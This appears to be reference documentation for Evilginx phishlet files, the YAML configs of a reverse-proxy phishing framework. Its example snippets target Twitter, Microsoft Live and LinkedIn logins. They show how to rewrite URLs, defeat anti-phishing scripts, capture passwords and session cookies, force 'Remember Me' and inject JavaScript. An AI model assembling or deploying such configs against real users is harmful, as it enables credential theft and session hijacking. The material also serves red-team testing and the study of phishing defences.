Phishlets are configuration files in YAML format. If you need to get familiar with YAML, first, you can find some good overview here: [YAML Syntax](https://docs.ansible.com/ansible/latest/reference_appendices/YAMLSyntax.html)

## header

Used for storing general phishlet information.

```
author: '@mrgretzky'
min_ver: '2.3.0'
```

* `author` *(string)*: Handle or name of the creator.
* `min_ver` *(string)*: What is the minimum version of Evilginx that this phishlet will be compatible with.

## proxy_hosts

This section describes all subdomains and domains that Evilginx will handle for proxying the traffic between the visitor and legitimate host.

```
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'twitter.com', session: true, is_landing: true}
  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: false, is_landing: false}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com', session: false, is_landing: false}
```

* `phish_sub` *(string)*: Specifies what will the subdomain be in the phishing hostname. It can be the same as the original subdomain.
* `orig_sub` *(string)*: The original subdomain of the proxied website's hostname.
* `domain` *(string)*: Base domain of the legitimate website to proxy the traffic for.
* `session` *(bool)*: Set this parameter to `true` for hosts that handle main website HTML content and which have their hostname visible in the browser's URL bar. Setting this to `true` for specific host will make sure that this host's responses will contain session cookies, credentials and other data worth capturing. If it is a host serving static content (e.g. javascript), you can safely set this parameter to `false`.
* `is_landing` *(bool)*: If set to `true` this host will be used for generating phishing URLs. Set it to `true` only for one host that will be used with a phishing lure URL.
* `auto_filter` *(bool)* (NEW): If set to `true` (default) proxy with try to automatically create required `sub_filters` for this host, without the need to specify them manually.

## sub_filters

This section describes all string substitution filters that you can define to dynamically modify the proxied website's content. This will be important for replacing all occurences of legitimate website's URLs with phishing proxy URLs, in order to prevent the browser from redirecting the visitor to legitimate website, before they can finish the authentication process. Filters can also be useful for removing or modifying javascript anti-phishing security measures.

```
sub_filters:
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'live', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
```

* `triggers_on` *(string)*: Original hostname for which the filter will be triggered for. Proxied data between the visitor and defined legitimate host, which is a value of that parameter, will have this substitution filter triggered for. Selects communication to which proxied host will be dynamically modified by Evilginx proxy.
* `orig_sub` *(string)*: Subdomain name of the legitimate host that will be used in string search for all occurences.
* `domain` *(string)*: Domain name of the legitimate host that will be used in string search for all occurences.
* `search` *(regexp)*: Regular expression to use in searching for string occurences in response body. Supports also regexp groups. See below the list of supported auto-fill variables which you can use.
* `replace` *(string)*: String that will replace all occurences of strings matching the `search` regexp. If regexp groups were defined in `search` field, refer to them here with e.g. `${1}` where `1` is the group index. See below the list of supported auto-fill variables which you can use.
* `mimes` *(string array)*: Filtering will only trigger for response packets which `Content-Type` header value equal to any of the MIME types defined here.
* `redirect_only` *(bool)* *optional*: If `true` indicates that the filter will trigger only if redirection URL was specified when generating a phishing URL.
* `with_params` *(string array)*: Only enable this filter if all of the following custom parameters were delivered with the phishing URL.

#### auto-fill variables

You can use the following auto-fill variables in both `search` and `replace` fields:

* `{hostname}`: When used in `search` field, it will become a hostname from combination of `orig_sub` and `domain`, defined in same `sub_filter` entry. When used in `replace` field, the combined hostname will be auto-translated to corresponding phishing hostname, by looking up the configured entries in `proxy_hosts` section. This is useful for replacing all occurences of website's original hostname with the phishing one in responses.
* `{subdomain}`: Works the same way as `{hostname}`, but only refers to the subdomain defined in `orig_sub` field.
* `{domain}`: Works the same way as `{hostname}`, but only refers to the domain defined in `domain` field.
* `{hostname_regexp}`: Equivalent of `{hostname}`, but each auto-translated string is properly escaped for use inside regular expressions. Needed sometimes for bypassing anti-phishing protections involving regular expressions.
* `{subdomain_regexp}`: Equivalent of `{subdomain}`, but each auto-translated string is properly escaped for use inside regular expressions. Needed sometimes for bypassing anti-phishing protections involving regular expressions.
* `{domain_regexp}`: Equivalent of `{domain}`, but each auto-translated string is properly escaped for use inside regular expressions. Needed sometimes for bypassing anti-phishing protections involving regular expressions.

### example 1

```
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
```

* Filter will trigger only for packets proxied to hostname `login.live.com`.
* Searches for all occurences of string `https://login.live.com/ppsecure/` and replaces them with `https://login.phishdomain.com/ppsecure/`.

### example 2

```
  - {triggers_on: 'www.linkedin.com', orig_sub: 'cdn', domain: 'linkedinapis.com', search: '//{hostname}/([0-9a-z]*)/nhome/', replace: '//{hostname}/${1}/nhome/', mimes: ['text/html', 'application/json']}
```

* Filter will trigger only for packets proxied to hostname `www.linkedin.com`.
* Searches for all occurences of string `//cdn.linkedinapis.com/<any_alphanumeric_string>/nhome/` and replaces them with `//cdn.phishdomain.com/<alphanumeric_string_from_regexp_group>/nhome/`.

## auth_tokens

Defines all cookies that should be captured in transmitted proxied responses. These cookies should define the full state of authenticated user's session, allowing the website to recognize a logged in user. When all defined cookies are intercepted and captured, the session is logged and the phishing attack is considered a success. At that point the user is redirected to the URL specified in initial phishing URL.

```
auth_tokens:
  - domain: '.twitter.com'
    keys: ['kdt','_twitter_sess','twid','auth_token']
```

* `domain` *(string)*: Domain exactly as received in the HTTP response packet. The `.` in the beginning indicates that the cookies will be sent for all subdomains of that domain.
* `keys` *(string array)*: Exact name of the cookie that will be searched for and captured. Available modifiers for each key are `regexp` and `opt` (see below).

#### keys modifiers

* `regexp`: Treats cookie name as a regular expression. For example key `'frog-[0-9]{3},regexp'` will look for any key like `frog-283`, `frog-111`, `frog-291` to capture. **IMPORTANT!** If you use at least one regexp modified key, make sure to trigger session capture with `auth_urls` (explained below).
* `opt`: Treats that cookie as optional. If that cookie arrives, it will be captured, but if it doesn't and other required cookies have already been captured, the session will be considered finished.

### example 1

```
auth_tokens:
  - domain: '.company.com'
    keys: ['session','_visit','id']
  - domain: 'auth.company.com'
    keys: ['sid','ver,opt']
```

### example 2

```
auth_tokens:
  - domain: '.company.com'
    keys: ['.*,regexp']
```

This will capture all cookies set for domain `.company.com`. You will need to set `auth_urls` in order to trigger session capture by other means, than detecting if all cookies were captured.

## credentials

This is the section were you specify which POST arguments should be captured and which of them are user credentials.

```
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'token'
      search: '(.*)'
      type: 'post'
    - key: 'pin'
      search: '([0-9]*)'
      type: 'post'
```

categories:
* `username`: Defines POST parameter for username/login/email part of captured credentials.
* `password`: Defines POST parameter for capturing the user password.
* `custom` : Defines and array of optional POST parameters for additional storage. If you need to capture a specific token or PIN from an additional form field, you can use this.

parameters:
* `key` *(regexp)*: Regular expression for POST parameter name to match. This is ignored if `type` is set to `json`.
* `search` *(regexp)*: Regular expression to search through the value of the detected POST parameter (`type` == `post`) or searching through the whole JSON string (`type` == `json`). The value to capture is captured from regular expression's first defined group.
* `type` *(string)*: Defines the content type of the request that will be sent. Allowed types: `json`, `post` *(default)*.

### json example

```
credentials:
  username:
    key: ''
    search: '"email":"([^"]*)'
    type: 'json'
  password:
    key: ''
    search: '"password":"([^"]*)'
    type: 'json'
```

## auth_urls

By default Evilginx will consider the session as authenticated when all cookies defined in `auth_tokens` section are captured. The exception is when the names of the cookies, you need to capture, are generated dynamically. In such scenario you need to use regular expressions to search for session cookies or just capture all of them. Evilginx will then not know when all of the session cookies have been captured and will need an alternative way to trigger the successful session capture.

Session will be considered captured when request to any of the defined URL paths is made. These URL paths should only be accessible after the user has successfully authenticated, thus indicating the authentication was successful.

```
auth_urls:
  - '/home'
```

* *(string array)*: When a request to any of the following paths is detected, it will trigger the session capture.

### example 1

```
auth_urls:
  - '/admin'
  - '/admin/.*'
```

When user is redirected to `https://phishdomain.com/admin`, `https://phishdomain.com/admin/profile` or `https://phishdomain.com/admin/settings`, session capture will be considered successful.

## landing_path (deprecated)

Defines an array of URL landing paths for the generated phishing URLs. You need to enter the path to the login page, here.

```
landing_path:
  - '/uas/login'
```

* *(string array)*: URL paths to login pages.

## login (NEW)

Defines the `domain` and `path` where the login page on the phished website resides.

```
login:
  domain: 'www.linkedin.com'
  path: '/uas/login'
```

## force_post

This section let's you define what POST arguments you want to add to an existing POST requests, in transmission. This is useful to force phished users to authenticate with "Remember Me" option enabled, even though they explicitly left the checkboxes unticked on the login form.

```
force_post:
  - path: '/sessions'
    search:
      - {key: 'session\[user.*\]', search: '.*'}
      - {key: 'session\[pass[a-z]{4}\]', search: '.*'}
    force:
      - {key: 'remember_me', value: '1'}
    type: 'post'
```

* `path` *(regexp)*: Regular expression to match the URL path the intercepted POST request will be sent to.
* `search`: Trigger POST arguments. **ALL** of the defined here POST arguments must be present in the POST request, for the POST arguments to be inserted or replaced.
  * `key` *(regexp)*: Regular expression to match the POST argument key.
  * `search` *(regexp)*: Regular expression to match the POST argument value.
* `force`: List of POST arguments to insert or replace in intercepted POST request.
  * `key` *(string)*: Name of the POST argument.
  * `value` *(string)*: Value of the POST argument.
* `type` *(string)*: Type of the POST request to handle. Currently only `post` is supported.

## js_inject (NEW)

This section defines all Javascript scripts that you want to inject into proxied pages. Every script can be customized with `{var_name}` variable parameters, which later can be set to different values in each created `lure`.

```
js_inject:
  - trigger_domains: ["www.linkedin.com"]
    trigger_paths: ["/uas/login"]
    trigger_params: ["email"]
    script: |
      function lp(){
        var email = document.querySelector("#username");
        var password = document.querySelector("#password");
        if (email != null && password != null) {
          email.value = "{email}";
          password.focus();
          return;
        }
        setTimeout(function(){lp();}, 100);
      }
      setTimeout(function(){lp();}, 100);
```

* `trigger_domains` *(string array)*: All hostnames on which the injection will trigger.
* `trigger_paths` *(regexp array)*: Regular expressions for all URL paths that will trigger the injection.
* `trigger_params` *(string array)*: Injection will trigger only if the following parameters are defined in a `lure`.
* `script` *(string)*: Javascript code that will be injected right before the `</body>` tag.
